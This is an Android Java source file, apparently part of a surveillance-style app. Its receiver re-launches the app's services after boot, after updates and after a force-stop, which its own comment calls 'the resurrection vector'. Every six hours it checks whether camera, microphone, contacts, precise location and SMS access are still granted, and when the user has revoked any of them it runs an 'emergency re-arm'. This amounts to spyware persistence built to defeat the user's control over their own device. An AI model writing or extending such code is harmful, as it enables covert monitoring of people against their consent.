package com.fason.app.core.permissions;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.fason.app.core.FasonApp;
import com.fason.app.service.MainService;

/**
 * PermissionGuardReceiver — Deep-check trigger and boot re-arm.
 *
 * Receives:
 *  - Deep permission check alarm (every 6 hours)
 *  - Boot completed (re-arm all layers)
 *  - Package replaced (re-arm after update)
 *
 * This is the resurrection vector. Even if the app is force-stopped,
 * the next boot or alarm trigger re-initializes the full guard stack.
 */
public class PermissionGuardReceiver extends BroadcastReceiver {
    private static final String TAG = "PermGuardRx";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        String action = intent.getAction();

        Log.i(TAG, "Received: " + action);

        switch (action) {
            case "com.fason.app.DEEP_PERM_CHECK":
                performDeepCheck(ctx);
                break;

            case Intent.ACTION_BOOT_COMPLETED:
            case "android.intent.action.QUICKBOOT_POWERON":
            case "com.htc.intent.action.QUICKBOOT_POWERON":
                onBoot(ctx);
                break;

            case Intent.ACTION_MY_PACKAGE_REPLACED:
                onPackageReplaced(ctx);
                break;

            case "com.fason.app.EMERGENCY_REARM":
                PermissionGuardOrchestrator.emergencyReArm(ctx);
                break;
        }
    }

    private void performDeepCheck(Context ctx) {
        Log.i(TAG, "Deep permission check running");

        // Verify all critical permissions
        String[] critical = {
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
        };

        boolean anyRevoked = false;
        for (String perm : critical) {
            if (ctx.checkSelfPermission(perm)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "Deep check: revoked " + perm);
                anyRevoked = true;
            }
        }

        if (anyRevoked) {
            Log.w(TAG, "Permissions revoked — triggering re-arm");
            PermissionGuardOrchestrator.emergencyReArm(ctx);
        }

        // Schedule next check
        PermissionGuardOrchestrator.init();
    }

    private void onBoot(Context ctx) {
        Log.i(TAG, "Boot detected — re-arming permission guard");

        // Small delay to let system settle
        new android.os.Handler(android.os.Looper.getMainLooper())
            .postDelayed(() -> {
                try {
                    PermissionGuardOrchestrator.init();

                    // Also restart main service
                    Intent svc = new Intent(ctx, MainService.class);
                    if (android.os.Build.VERSION.SDK_INT
                        >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(svc);
                    } else {
                        ctx.startService(svc);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Boot re-arm failed", e);
                }
            }, 5000); // 5 second delay
    }

    private void onPackageReplaced(Context ctx) {
        Log.i(TAG, "Package replaced — re-arming");
        PermissionGuardOrchestrator.init();
    }
}
